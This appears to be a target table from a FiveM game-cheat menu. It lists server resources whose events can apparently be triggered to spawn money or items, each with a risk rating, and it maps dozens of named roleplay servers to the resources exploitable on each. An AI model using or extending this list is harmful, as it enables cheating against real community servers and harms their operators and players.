        { id = "ak4y_playtime_shop", name = "Money Trigger (Medium Risk)", type = "money", res = {"ak4y-playTimeShop"}, all = false },
        { id = "angelicxs_civilian_payment", name = "Money Trigger (SAFE)", type = "money", res = {"angelicxs-civilianjobs"}, all = false },
        { id = "angelicxs_civilian_item", name = "Any Item Trigger (SAFE)", type = "item", res = {"angelicxs-civilianjobs"}, all = false },
        { id = "apex_cluckinbell", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"apex_cluckinbell"}, all = false },
        { id = "apex_rexdiner", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"apex_rexdiner"}, all = false },
        { id = "ars_hunting", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ars_hunting"}, all = false },
        { id = "ars_vvsgrillz", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ars_vvsgrillz_v2"}, all = false },
        { id = "ars_vvsguns", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ars_vvsguns"}, all = false },
        { id = "ars_vvsjewelry", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ars_vvsjewelry"}, all = false },
        { id = "ars_whitewidow", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ars_whitewidow_v2"}, all = false },
        { id = "av_business", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"av_business"}, all = false },
        { id = "boii_drugs", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"boii-drugs"}, all = false },
        { id = "boii_moneylaunderer", name = "Money Trigger (Medium Risk)", type = "money", res = {"boii-moneylaunderer"}, all = false },
        { id = "boii_pawnshop", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"boii-pawnshop"}, all = false },
        { id = "boii_salvage_diving", name = "Any Event Trigger (Medium Risk)", type = "event", res = {"boii-salavagediving"}, all = false },
        { id = "boii_whitewidow", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"boii_whitewidow"}, all = false },
        { id = "brutal_hunting", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"brutal_hunting"}, all = false },
        { id = "brutal_shop_robbery", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"brutal_shop_robbery"}, all = false },
        { id = "cfx_tcd_starter", name = "Any Event Trigger (Medium Risk)", type = "event", res = {"cfx-tcd-starterpack"}, all = false },
        { id = "core_crafting", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"core_crafting"}, all = false },
        { id = "d3mba_heroin", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"d3MBA-heroin"}, all = false },
        { id = "dcweedroll", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"dcweedroll"}, all = false },
        { id = "dcweedrollnew", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"dcweedrollnew"}, all = false },
        { id = "devcore_needs", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"devcore_needs"}, all = false },
        { id = "devcore_smokev2", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"devcore_smokev2"}, all = false },
        { id = "dusa_pets", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"dusa-pets"}, all = false },
        { id = "dusa_pet_shop", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"dusa_pet"}, all = false },
        { id = "dv_donut_delivery", name = "Money Trigger (Medium Risk)", type = "money", res = {"dv-donutdeliveryjob"}, all = false },
        { id = "esx_weashop", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"esx_weashop"}, all = false },
        { id = "ez_lib", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"ez_lib"}, all = false },
        { id = "fivecode_camping", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"fivecode_camping"}, all = false },
        { id = "food_mechanics", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"food_mechanics"}, all = false },
        { id = "forge_starter", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"forge-starter"}, all = false },
        { id = "fs_placeables", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"fs_placeables"}, all = false },
        { id = "fuksus_shops", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"fuksus-shops"}, all = false }, -- FIXED: was "Any Item casino"
        { id = "gardener_job", name = "Money Trigger (Medium Risk)", type = "money", res = {"gardenerjob"}, all = false },
        { id = "guatau_consumibles", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"guataubaconsumibles"}, all = false },
        { id = "hg_wheel", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"hg-wheel"}, all = false },
        { id = "horizon_payment", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"horizon_paymentsystem"}, all = false },
        { id = "complete_hunting", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"hunting"}, all = false },
        { id = "inside_fruitpicker", name = "Money Trigger (Medium Risk)", type = "money", res = {"inside-fruitpicker"}, all = false },
        { id = "inverse_consumables", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"inverse-consumables"}, all = false },
        { id = "it_lib", name = "Any Item Trigger (SAFE)", type = "item", res = {"it-lib"}, all = false },
        { id = "jg_mechanic", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jg-mechanic"}, all = false },
        { id = "jim_bakery", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-bakery"}, all = false },
        { id = "jim_beanmachine", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-beanmachine"}, all = false },
        { id = "jim_burgershot", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-burgershot"}, all = false },
        { id = "jim_catcafe", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-catcafe"}, all = false },
        { id = "jim_consumables", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-consumables"}, all = false },
        { id = "jim_mechanic", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-mechanic"}, all = false },
        { id = "jim_mining", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-mining"}, all = false },
        { id = "jim_pizzathis", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-pizzathis"}, all = false },
        { id = "jim_recycle", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-recycle"}, all = false },
        { id = "jim_shops_blackmarket", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-shops"}, all = false },
        { id = "jim_shops_open", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"jim-shops"}, all = false },
        { id = "kaves_drugsv2", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"kaves_drugsv2"}, all = false },
        { id = "mt_restaurants", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"mt-restaurants"}, all = false },
        { id = "mt_printers", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"mt_printers"}, all = false },
        { id = "nx_cayo", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"nx-cayo"}, all = false },
        { id = "okok_crafting", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"okokCrafting"}, all = false },
        { id = "pug_business_creator", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"pug-businesscreator"}, all = false },
        { id = "pug_chopping", name = "Money Trigger (Medium Risk)", type = "money", res = {"pug-chopping"}, all = false },
        { id = "pug_fishing", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"pug-fishing"}, all = false },
        { id = "pug_robbery_creator", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"pug-robberycreator"}, all = false },
        { id = "qb_crafting", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"qb-crafting"}, all = false },
        { id = "qb_drugs", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"qb-drugs"}, all = false },
        { id = "qb_garbage_job", name = "Money Trigger (Medium Risk)", type = "money", res = {"qb-garbagejob"}, all = false },
        { id = "qb_hotdog_job", name = "Money Trigger (Medium Risk)", type = "money", res = {"qb-hotdogjob"}, all = false },
        { id = "qb_recycle_job", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"qb-recyclejob"}, all = false },
        { id = "qb_trash_search", name = "Money Trigger (Medium Risk)", type = "money", res = {"qb-trashsearch"}, all = false },
        { id = "qb_warehouse", name = "Money Trigger (Medium Risk)", type = "money", res = {"qb-warehouse"}, all = false },
        { id = "rm_camperv", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"rm_camperv"}, all = false },
        { id = "ry_rent", name = "Money Trigger (Medium Risk)", type = "money", res = {"ry_rent"}, all = false },
        { id = "savana_trucker", name = "Money Trigger (Medium Risk)", type = "money", res = {"savana-truckerjob"}, all = false },
        { id = "sayer_jukebox", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"sayer-jukebox"}, all = false },
        { id = "sell_usb", name = "Any Event Trigger (Medium Risk)", type = "event", res = {"sell_usb"}, all = false },
        { id = "snipe_boombox", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"snipe-boombox"}, all = false },
        { id = "solos_cashier", name = "Money Trigger (Medium Risk)", type = "money", res = {"solos-cashier"}, all = false },
        { id = "solos_food", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"solos-food"}, all = false },
        { id = "solos_hookah", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"solos-hookah"}, all = false },
        { id = "solos_jointroll", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"solos-jointroll"}, all = false },
        { id = "solos_joints", name = "Any Item Trigger (High Risk)", type = "item", res = {"solos-joints"}, all = false },
        { id = "solos_methlab", name = "Any Item Trigger (High Risk)", type = "item", res = {"solos-methlab"}, all = false },
        { id = "solos_moneywash", name = "Any Item Trigger (High Risk)", type = "item", res = {"solos-moneywash"}, all = false },
        { id = "solos_restaurants", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"solos-restaurants"}, all = false },
        { id = "t1ger_gangsystem", name = "Any Item Trigger (High Risk)", type = "item", res = {"t1ger_gangsystem"}, all = false },
        { id = "t1ger_lib", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"t1ger_lib"}, all = false },
        { id = "xmmx_letscookplus", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"xmmx_letscookplus"}, all = false },
        { id = "zat_farming", name = "Any Item Trigger (Medium Risk)", type = "item", res = {"zat-farming"}, all = false },
        { id = "zat_weed", name = "Any Item Trigger (High Risk)", type = "item", res = {"zat-weed"}, all = false },
        -- === FROMTHEBOTTOM LA ===
    { id = "fromthebottom_la", name = "~g~[FromTheBottom LA] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === CENTRAL VALLEY V3 ===
    { id = "central_valley_v3", name = "~g~[Central Valley V3] Jim Consumables", res = {"jim-consumables"}, type = "item", risk = "safe", all = true },
    -- === DA GHETTO LA RP ===
    { id = "da_ghetto_la_rp", name = "~g~[Da Ghetto LA RP] IT-Lib", res = {"it-lib"}, type = "item", risk = "safe", all = true },
    -- === MAFIA LAND RP (1x only) ===
    { id = "mafia_land_rp", name = "~y~[Mafia Land RP] DevCore SmokeV2 (1x)", res = {"devcore_smokev2"}, type = "item", risk = "medium", all = true },
    -- === LAND OF HUSTLERS RP (1x only) ===
    { id = "land_of_hustlers_rp", name = "~y~[Land Of Hustlers RP] DevCore Needs (1x)", res = {"devcore_needs"}, type = "item", risk = "medium", all = true },
    -- === GANGSTERS PARADICE ===
    { id = "gangsters_paradice", name = "~g~[Gangsters Paradice] R Scripts Tuning", res = {"r_scripts-tuningV2"}, type = "item", risk = "safe", all = true },
    -- === THEGARDENS CHICAGO (MONEY) ===
    { id = "thegardens_chicago", name = "~r~[TheGardens Chicago] Jail Work Money", res = {"esx-qalle-jail"}, type = "event", risk = "high", all = true },
    -- === COLD HEARTED NYC ===
    { id = "cold_hearted_nyc", name = "~g~[Cold Hearted NYC] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === REVENGE SERIOUS RP ===
    { id = "revenge_serious_rp", name = "~g~[Revenge Serious RP] Jim Consumables", res = {"jim-consumables"}, type = "item", risk = "safe", all = true },
    -- === STRAIGHT OUT THE GUTTA SRP ===
    { id = "straight_out_the_gutta_srp", name = "~g~[Straight Out Gutta] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === GET WILD CHIRAQ RP ===
    { id = "get_wild_chiraq_rp", name = "~g~[Get Wild Chiraq] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === GHOST CITY ROLEPLAY (1x) ===
    { id = "ghost_city_roleplay", name = "~y~[Ghost City] Apex Cluckinbell (1x)", res = {"apex_cluckinbell"}, type = "item", risk = "medium", all = true },
    -- === TRUEVISION ROLEPLAY ===
    { id = "truevision_roleplay", name = "~g~[TrueVision RP] TVRP Drugs", res = {"tvrpdrugs"}, type = "item", risk = "safe", all = true },
    -- === TALES FROM THE HOOD RP (Multiple) ===
    { id = "tales_from_the_hood_rp", name = "~g~[Tales From Hood] NK BBQ + Pug", res = {"nk-barbeque", "Pug"}, type = "item", risk = "safe", all = false },
    -- === THE STRIP RP ===
    { id = "the_strip_rp", name = "~g~[The Strip RP] Matti Airsoft", res = {"matti-airsoft"}, type = "item", risk = "safe", all = true },
    -- === MURDAVILLE RP (MONEY) ===
    { id = "murdaville_rp", name = "~r~[MurdaVille RP] Starter Pack Money", res = {"apx_starterpack"}, type = "event", risk = "high", all = true },
    -- === THE FLATS ROLEPLAY (Multiple) ===
    { id = "the_flats_roleplay", name = "~g~[The Flats] QB Drugs + Jim Mining", res = {"qb-advancedrugs", "jim-mining"}, type = "item", risk = "safe", all = false },
    -- === LA CHRONICLES (Multiple) ===
    { id = "la_chronicles_roleplay", name = "~g~[LA Chronicles] Horizon + Solos + WP", res = {"horizon_paymentsystem", "solos-joints", "wp-pocketbikes"}, type = "item", risk = "safe", all = false },
    -- === TOE TAG WORLD RP (Multiple) ===
    { id = "toe_tag_world_rp", name = "~g~[Toe Tag World] Boii + Jim Mining", res = {"boii-moneylaunderer", "boii-consumables", "jim-mining"}, type = "item", risk = "safe", all = false },
    -- === FEDERAL NIGHTMARES NYC ===
    { id = "federal_nightmares_nyc", name = "~g~[Federal Nightmares] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === CFW X3F6 S8 ===
    { id = "cfw_x3f6_s8", name = "~g~[CFW X3F6] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === WHITE CHALK RP ===
    { id = "white_chalk_rp", name = "~g~[White Chalk RP] AngelicXS Jobs", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === HUSTLA ROLEPLAY V2 (Multiple) ===
    { id = "hustla_roleplay_v2", name = "~g~[Hustla V2] XMMX + HG Wheel", res = {"xmmx_letscookplus", "hg-wheel"}, type = "item", risk = "safe", all = false },
    -- === MOTOR CITY ROLEPLAY ===
    { id = "motor_city_roleplay", name = "~g~[Motor City] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === CHICAGO HEIGHTS RP (Multiple) ===
    { id = "chicago_heights_rp", name = "~g~[Chicago Heights] Weedroll + XMMX", res = {"weedroll", "xmmx_letscookplus"}, type = "item", risk = "safe", all = false },
    -- === THE BOX RP ===
    { id = "the_box_rp", name = "~g~[The Box RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === FEED THA FAMILY V2 ===
    { id = "feed_tha_family_v2", name = "~g~[Feed Tha Family V2] XMMX", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === NEWENERGYRP ===
    { id = "newenergyrp", name = "~g~[NewEnergyRP] Jim Mining", res = {"jim-mining"}, type = "item", risk = "safe", all = true },
    -- === FRONTSTREET RP (1x) ===
    { id = "frontstreet_rp", name = "~y~[FrontStreet RP] AK47 ID Card (1x)", res = {"ak47_idcard"}, type = "item", risk = "medium", all = true },
    -- === ONTHEFLO ===
    { id = "ontheflo", name = "~g~[OnTheFlo] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === UNPHAZED ROLEPLAY ===
    { id = "unphazed_roleplay", name = "~g~[UNPHAZED] Jim Mining", res = {"jim-mining"}, type = "item", risk = "safe", all = true },
    -- === THAT 70S ROLEPLAY ===
    { id = "that_70s_roleplay", name = "~g~[That 70s] Jim Mechanic", res = {"jim-mechanic"}, type = "item", risk = "safe", all = true },
    -- === SOB RP ===
    { id = "sob_rp", name = "~g~[SOB RP] HG Wheel", res = {"hg-wheel"}, type = "item", risk = "safe", all = true },
    -- === YBN CHIRAQ RP ===
    { id = "ybn_chiraq_rp", name = "~g~[YBN Chiraq] AngelicXS", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === CHIRAQ CITY (1x) ===
    { id = "chiraq_city", name = "~y~[Chiraq City] DevCore Needs (1x)", res = {"devcore_needs"}, type = "item", risk = "medium", all = true },
    -- === BAYSHORE HEIGHTS (1x) ===
    { id = "bayshore_heights", name = "~y~[Bayshore Heights] T1GER Lib (1x)", res = {"t1ger_lib"}, type = "item", risk = "medium", all = true },
    -- === REWIND RP ===
    { id = "rewind_rp", name = "~g~[REWIND RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === CRIME IN THE D ===
    { id = "crimeinthed_serious_rp", name = "~g~[CrimeInTheD] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === LAKESHORE RP ===
    { id = "lakeshore_rp", name = "~g~[Lakeshore RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === THE CORNER NYC ===
    { id = "the_corner_nyc", name = "~g~[The Corner NYC] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === BIG YARD RP ===
    { id = "big_yard_rp", name = "~g~[Big Yard RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === STREETS CALLIN RP ===
    { id = "streets_callin_rp", name = "~g~[Streets Callin] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === STREETZ OF THE CHI ===
    { id = "streetz_of_the_chi", name = "~g~[Streetz Of Chi] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === TB2LA RP ===
    { id = "tb2la_rp", name = "~g~[TB2LA RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === NEW PAPE RP V4 ===
    { id = "new_pape_rp_v4", name = "~g~[New Pape V4] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === CHICAGO VENDETTA RP ===
    { id = "chicago_vendetta_rp", name = "~g~[Chicago Vendetta] AK47 DrugManager", res = {"ak47_drugmanager"}, type = "item", risk = "safe", all = true },
    -- === LAST STOP ===
    { id = "last_stop", name = "~g~[LAST STOP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === METRO HEIGHTS ===
    { id = "metro_heights_roleplay", name = "~g~[Metro Heights] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === DIRTY MONEY ===
    { id = "dirty_money", name = "~g~[Dirty Money] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === FAZOLAND CHIRAQ ===
    { id = "fazoland_chiraq", name = "~g~[Fazoland Chiraq] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === ALL THE SMOKE V2 ===
    { id = "all_the_smoke_rp_v2", name = "~g~[All The Smoke V2] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === GET WILD CHIRAQ C5 ===
    { id = "get_wild_chiraq_rp_c5", name = "~g~[Get Wild C5] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === NO ATTEMPT ===
    { id = "no_attempt", name = "~g~[No Attempt] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === ITS ONLY MONEY RP ===
    { id = "its_only_money_rp", name = "~g~[Its Only Money] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === GRITTY NYC ===
    { id = "gritty_nyc", name = "~g~[GRITTY NYC] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === TRI-STATE RP ===
    { id = "tri_state_rp", name = "~g~[Tri-State RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === THE GATES RP (Multiple) ===
    { id = "the_gates_rp", name = "~g~[The Gates RP] AK47 + AngelicXS", res = {"ak47_drugmanager", "angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = false },
    -- === TNN RP ===
    { id = "tnn_rp", name = "~g~[TNN RP] Jim Consumables", res = {"jim-consumables"}, type = "item", risk = "safe", all = true },
    -- === UNITY RP (Multiple) ===
    { id = "unity_rp", name = "~g~[Unity RP] Jim Consumables + Pug", res = {"jim-consumables", "Pug"}, type = "item", risk = "safe", all = false },
    -- === STELLARXX (1x) ===
    { id = "stellarxx", name = "~y~[StellarXx] Zat Farming (1x)", res = {"zat-farming"}, type = "item", risk = "medium", all = true },
    -- === PARADISE ROLEPLAY (Multiple) ===
    { id = "paradise_roleplay", name = "~g~[Paradise RP] AngelicXS + XMMX", res = {"angelicxs-CivilianJobs", "xmmx_letscookplus"}, type = "item", risk = "safe", all = false },
    -- === ELITE RP 4.0 ===
    { id = "elite_rp_4_0", name = "~g~[Elite RP 4.0] Kaves DrugsV2", res = {"kaves_drugsv2"}, type = "item", risk = "safe", all = true },
    -- === THE CITY WL ===
    { id = "the_city_wl", name = "~g~[The City WL] Kaves DrugsV2", res = {"kaves_drugsv2"}, type = "item", risk = "safe", all = true },
    -- === DREAMZZZ RP (Multiple) ===
    { id = "dreamzzz_rp", name = "~g~[DreamZzZ RP] Kaves + XMMX", res = {"kaves_drugsv2", "xmmx_letscookplus"}, type = "item", risk = "safe", all = false },
    -- === PROJECT HAVEN ===
    { id = "project_haven", name = "~g~[Project Haven] AngelicXS", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === PHOENIX RP ===
    { id = "phoenix_rp", name = "~g~[Phoenix RP] AngelicXS", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === SMOKE VALLEY V2 ===
    { id = "smoke_valley_rp_v2", name = "~g~[Smoke Valley V2] AngelicXS", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === STRIKE CITY DETROIT (Multiple) ===
    { id = "strike_city_detroit", name = "~g~[Strike City Detroit] AngelicXS + T1GER", res = {"angelicxs-CivilianJobs", "t1ger_lib"}, type = "item", risk = "safe", all = false },
    -- === MOONLIGHT ROLEPLAY ===
    { id = "moonlight_roleplay", name = "~g~[Moonlight RP] AngelicXS", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === MAFIA FAMILY RP ===
    { id = "mafia_family_rp", name = "~g~[Mafia Family RP] AngelicXS", res = {"angelicxs-CivilianJobs"}, type = "item", risk = "safe", all = true },
    -- === EVAROSE V2 ===
    { id = "evarose_v2", name = "~g~[EvaRose V2] Jim Consumables", res = {"jim-consumables"}, type = "item", risk = "safe", all = true },
    -- === EVERGREEN RP ===
    { id = "evergreen_rp", name = "~g~[Evergreen RP] Jim Burgershot", res = {"jim-burgershot"}, type = "item", risk = "safe", all = true },
    -- === FREESTYLE RP ===
    { id = "freestyle_rp", name = "~g~[Freestyle RP] Jim Consumables", res = {"jim-consumables"}, type = "item", risk = "safe", all = true },
    -- === MORPHEUSRP ===
    { id = "morpheusrp", name = "~g~[MorpheusRP] MT Restaurants", res = {"mt-restaurants"}, type = "item", risk = "safe", all = true },
    -- === CLOUD 9 ROLEPLAY ===
    { id = "cloud_9_roleplay", name = "~g~[Cloud 9] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === CREATION ROLEPLAY V2 ===
    { id = "creation_roleplay_v2", name = "~g~[Creation V2] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === GREENLEAF ROLEPLAY ===
    { id = "greenleaf_roleplay", name = "~g~[Greenleaf] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === PROJECT GENESIS 2.0 ===
    { id = "project_genesis_2_0", name = "~g~[Project Genesis 2.0] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === THE VAULT RP ===
    { id = "the_vault_rp", name = "~g~[The Vault RP] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === HAZY DAYS RP ===
    { id = "hazy_days_rp", name = "~g~[Hazy Days RP] Jim Recycle", res = {"jim-recycle"}, type = "item", risk = "safe", all = true },
    -- === OAKWOOD HILLS ===
    { id = "oakwood_hills", name = "~g~[Oakwood Hills] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === PLAYITA ROLEPLAY ===
    { id = "playita_roleplay", name = "~g~[Playita] QB Drugs", res = {"qb-drugs"}, type = "item", risk = "safe", all = true },
    -- === WHIP CITY RP ===
    { id = "whip_city_rp", name = "~g~[Whip City RP] XMMX Letscook+", res = {"xmmx_letscookplus"}, type = "item", risk = "safe", all = true },
    -- === MARBLE ROCK (Multiple) ===
    { id = "marble_rock", name = "~g~[Marble Rock] Pug + T1GER", res = {"Pug", "t1ger_lib"}, type = "item", risk = "safe", all = false },
    -- === IRON HAVEN ROLEPLAY ===
    { id = "iron_haven_roleplay", name = "~g~[Iron Haven] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === GR8 RP RELOADED ===
    { id = "gr8_rp_reloaded", name = "~g~[Gr8 RP Reloaded] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === UNTAMED SERENITY RP ===
    { id = "untamed_serenity_rp", name = "~g~[Untamed Serenity] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === LOS SANTOS BY NIGHT ===
    { id = "los_santos_by_night", name = "~g~[Los Santos By Night] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === HIGH TIMES ROLEPLAY ===
    { id = "high_times_roleplay", name = "~g~[High Times] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === CITY OF DALLAS RP ===
    { id = "city_of_dallas_rp", name = "~g~[City of Dallas] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === BIGCITYRP ===
    { id = "bigcityrp", name = "~g~[BigCityRP] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === MERCY RP ===
    { id = "mercy_rp", name = "~g~[Mercy RP] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === BANANA GAMING V2 ===
    { id = "banana_gaming_v2", name = "~g~[Banana Gaming V2] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === LIFELINE RP 2.0 ===
    { id = "lifeline_rp_2_0", name = "~g~[Lifeline RP 2.0] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === ILLUSIONS RP ===
    { id = "illusions_rp", name = "~g~[Illusions RP] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === INCITY RP 2.0 ===
    { id = "incity_rp_2_0", name = "~g~[InCity RP 2.0] Pug Chopping", res = {"Pug"}, type = "item", risk = "safe", all = true },
    -- === NEWWORLD RP ===
    { id = "newworld_rp", name = "~g~[NewWorld RP] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === DESIGNER GAS CLUB ===
    { id = "designer_gas_club", name = "~g~[Designer Gas Club] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === DIRTY SOUTH ROLEPLAY ===
    { id = "dirty_south_roleplay", name = "~g~[Dirty South] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === CARTEL DREAMS ===
    { id = "cartel_dreams", name = "~g~[Cartel Dreams] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === UNWRITTEN RP ===
    { id = "unwritten_rp", name = "~g~[Unwritten RP] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === LOS ANGELES DOJRP ===
    { id = "los_angeles_dojrp", name = "~g~[LA DOJRP] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === LOVERLOSER SLIME CITY (Multiple) ===
    { id = "loverloser_slime_city_rp", name = "~g~[LoverLoser Slime] T1GER + XMMX", res = {"t1ger_lib", "xmmx_letscookplus"}, type = "item", risk = "safe", all = false },
    -- === RISING DAWN 2.0 ===
    { id = "rising_dawn_roleplay_2_0", name = "~g~[Rising Dawn 2.0] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === NORTHERN RP ===
    { id = "northern_rp", name = "~g~[Northern RP] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === COLORADO STATE ROLEPLAY ===
    { id = "colorado_state_roleplay", name = "~g~[Colorado State] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === HUSTLAZ PARADISE ===
    { id = "hustlaz_paradise", name = "~g~[Hustlaz Paradise] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
    -- === WICKED RP ===
    { id = "wicked_rp", name = "~g~[Wicked RP] T1GER Lib", res = {"t1ger_lib"}, type = "item", risk = "safe", all = true },
